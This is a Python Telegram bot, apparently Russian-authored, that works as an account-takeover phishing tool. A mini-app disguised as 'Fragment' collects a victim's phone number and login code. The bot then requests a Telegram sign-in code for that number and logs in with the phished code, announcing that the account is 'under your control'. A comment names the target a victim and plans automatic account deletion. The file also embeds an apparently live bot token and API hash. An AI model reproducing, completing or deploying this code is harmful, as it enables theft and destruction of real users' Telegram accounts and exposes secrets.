import json, asyncio, logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient

# --- ТВОИ ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com" 

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
# Словарь для хранения активных сессий
active_sessions = {}

# Команда /start добавляет кнопку Fragment в меню
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    
    await bot.set_chat_menu_button(
        chat_id=message.chat.id,
        menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL))
    )
    await message.answer("🚀 **Панель Fragment активирована!**\nНажми кнопку в меню слева, чтобы начать.")

# ОБРАБОТКА ДАННЫХ ИЗ MINI APP
@dp.message(F.web_app_data)
async def handle_web_app_data(message: types.Message):
    data = json.loads(message.web_app_data.data)
    action = data.get("action")
    phone = data.get("phone")
    
    if action == "send_code":
        await message.answer(f"📩 **Запрос кода для:** `{phone}`\nПожалуйста, подождите...", parse_mode="Markdown")
        
        # Создаем клиента Telethon для отправки кода
        client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
        active_sessions[phone] = client
        
        await client.connect()
        try:
            # ВОТ ЭТА КОМАНДА ЗАСТАВЛЯЕТ TELEGRAM ОТПРАВИТЬ КОД ЖЕРТВЕ
            await client.send_code_request(phone)
            await message.answer(f"✅ **Код успешно отправлен!**\nПользователь `{phone}` должен получить его в Telegram.", parse_mode="Markdown")
        except Exception as e:
            await message.answer(f"❌ **Ошибка отправки кода:**\n`{str(e)}`", parse_mode="Markdown")
            await client.disconnect()

    elif action == "login_and_del":
        code = data.get("code")
        client = active_sessions.get(phone)
        
        if not client:
            await message.answer("❌ Ошибка: Сессия не найдена. Попробуйте ввести номер заново.")
            return

        await message.answer(f"⚙️ **Вхожу в аккаунт `{phone}`...**", parse_mode="Markdown")
        
        try:
            # Входим в аккаунт по коду из Mini App
            await client.sign_in(phone, code)
            await message.answer(f"🔓 **ВХОД ВЫПОЛНЕН!**\nАккаунт `{phone}` теперь под вашим контролем.", parse_mode="Markdown")
            
            # Здесь можно добавить автоматическое удаление через my.telegram.org
            # Но для начала проверь сам вход.
            
        except Exception as e:
            await message.answer(f"❌ **Ошибка входа:**\n`{str(e)}`", parse_mode="Markdown")

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
